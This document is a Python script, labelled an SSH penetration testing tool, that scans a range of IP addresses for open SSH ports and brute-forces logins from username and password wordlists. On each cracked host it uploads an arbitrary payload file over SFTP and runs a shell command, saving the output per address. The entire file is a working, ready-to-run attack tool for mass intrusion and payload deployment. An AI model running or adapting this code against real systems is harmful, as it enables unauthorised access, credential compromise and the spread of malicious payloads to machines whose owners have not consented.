#!/usr/bin/python3

import argparse
import signal
import sys
import paramiko
from socket import *
import os
import time
from threading import Thread

green_text = "\033[32m"
reset_text = "\033[0m"


ssh_scan = None
res_path = "scanresult"

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    global EXIT
    EXIT=True
    ssh_scan.stop()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


SSH_STATE = {"RUNNING":1,"END":0, "IDLE":2}


class SSHScan():

    def __init__(self, 
                 start_ip, 
                 end_ip, 
                 user_file, 
                 password_file,
                 verbose,
                 ssh_port,
                 max_thread,
                 timeout,
                 command,
                 payload_file,
                 upload_dir

                 ):

        
        self.start_ip = start_ip 
        self.end_ip = end_ip 
        self.user_ssh_file = user_file
        self.pass_ssh_file = password_file 
        self.verbose = verbose
        self.user_list = []
        self.pass_list = []
        self.ssh_linux_shellcode = command 
        self.ssh_port = ssh_port 
        self.max_thread = max_thread 
        self.timeout = timeout 
        self.forced_exit = False
        self.thread_list = {}
        self.payload_file = payload_file
        self.upload_dir = upload_dir
    

    def _remove_ip(self, ip):
        del self.thread_list[ip]

    def _loadDictionary(self):
        ff = open(self.user_ssh_file, 'r')
        self.user_list = ff.readlines()
        ff.close()

        ff = open(self.pass_ssh_file, 'r')
        self.pass_list = ff.readlines()
        ff.close()

    def stop(self):
        self.forced_exit = True

    def _incIP(self,ip):
        a,b,c,d = ip.split(".")

        a=int(a)
        b=int(b)
        c=int(c)
        d=int(d)

        if d<255:
            d=d+1
        elif c<255:
            c=c+1
            d=0
        elif b<255:
            b=b+1
            d=0
            c=0
        elif a<255:
            a=a+1
            d=0
            c=0
            b=0
        return "{}.{}.{}.{}".format(a,b,c,d)

    def hack_ssh(self):

        if not os.path.exists(res_path):
            os.mkdir(res_path)

        print("Scanning for ssh services...")
        while self.start_ip!=self.end_ip:
            if self.forced_exit:
                return

            if len(self.thread_list)>=self.max_thread:
                time.sleep(2)
            else:
                ip = self.start_ip
                if self.verbose:
                    print("Scanning ip {}".format(ip))
                t = Thread(target=self._scan_ip, args=(ip,))
                t.start()
                self.thread_list[ip] = t


            self.start_ip = self._incIP(self.start_ip)

        while len(self.thread_list)>0:
            time.sleep(3)
        
        print("Done!")

    def _scan_ip(self, ip):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if self.forced_exit:
            return

        connSkt = None
        try:
            connSkt = socket(AF_INET, SOCK_STREAM)
            connSkt.settimeout(self.timeout)
            connSkt.connect((ip, self.ssh_port))
            print("[*] {}:{} open".format(ip,self.ssh_port))
        
        except:
            connSkt.close()
            try:
                self._remove_ip(ip)
            except:
                pass
            return
        finally:
            connSkt.close()

        for psw in self.pass_list:
            psw=psw.strip("\n")

            if self.forced_exit:
                return

            for user in self.user_list:
                user = user.strip("\n")

                if self.forced_exit:
                    return
                psw=psw.strip("\n")
                try:
                    if self.verbose:
                        print("Cracking SSH account ({}/{})...".format(user,psw))
                    ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
                    print(green_text+"[*] Password found ({}/{}) on {}:{}".format(user,psw, ip, self.ssh_port)+reset_text)


                    if self.payload_file is not None:
                        print("Uploading payload {} to {}...".format(self.payload_file, self.upload_dir))
                        sftp = ssh.open_sftp()
                        sftp.put(self.payload_file, self.upload_dir)
                        sftp.close()

                    if self.ssh_linux_shellcode is not None:
                        print("Sending command: {}".format(self.ssh_linux_shellcode)) 
                        stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)
                        output=stdout.readlines()
                        
                        print("\n--- RESPONSE ---")
                        print("\n".join(output))
                        print("-------------")

                        ssh.close()
                        
                        ww = open(res_path+"/"+ip+".txt",'w')
                        for line in output:
                            ww.write(line)
                        ww.close()
                        


                except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
                    ssh.close()
                    continue
                except:
                    self._remove_ip(ip)
                    return
        self._remove_ip(ip)

        

def scan(start_ip,
        end_ip,
        user_file,
        password_file, 
        verbose=False,
        port=22, 
        max_thread=10, 
        timeout=3, 
        command=None,
        payload_file=None,
        upload_dir="/tmp"):

    global ssh_scan 
    ssh_scan = SSHScan(start_ip,
                       end_ip,
                       user_file,
                       password_file,
                       verbose,
                       port,
                       max_thread,
                       timeout,
                       command,
                        payload_file,
                        upload_dir
                       )


    ssh_scan._loadDictionary()
    ssh_scan.hack_ssh()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SSH penetration testing tool")
    parser.add_argument("start_ip", help="Start ip address")
    parser.add_argument("end_ip", help="Stop ip address")
    parser.add_argument("user_file", help="Users file list")
    parser.add_argument("password_file", help="Password file list")
    parser.add_argument("--verbose", action="store_true", default=False, help="Set verbose output")
    parser.add_argument("--port", default=22, help="Default ssh port")
    parser.add_argument("--max-thread", default=10, help="Max threads")
    parser.add_argument("--timeout", default=3, help="Connection timeout")
    parser.add_argument("--command", default=None, help="Shell command")
    parser.add_argument("--payload", default=None, help="Payload file")
    parser.add_argument("--upload-dir", default=None, help="Upload directory")
    args = parser.parse_args()
    
    scan(args.start_ip,
        args.end_ip,
        args.user_file,
        args.password_file,
        args.verbose,
        int(args.port),
        int(args.max_thread),
        int(args.timeout),
        args.command,
        args.payload,
        args.upload_dir)
